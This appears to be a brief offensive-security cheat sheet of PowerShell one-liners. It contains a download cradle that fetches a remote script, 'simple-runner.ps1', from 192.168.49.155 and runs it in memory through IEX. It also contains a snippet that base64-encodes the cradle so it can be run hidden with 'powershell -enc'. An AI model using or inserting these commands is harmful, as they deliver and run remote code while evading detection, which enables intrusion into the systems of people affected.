## Onliner


### Powershell
#ps1 #runner #cradle
Download cradle in memory:
``` ps1
(New-Object System.Net.WebClient).DownloadString("http://192.168.49.155/simple-runner.ps1") | IEX
```

#ps1 #encoding
Encode download cradle:
``` ps1
$text = "<download cradle>"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
# then to execute use powershell -enc <encoded_text>
```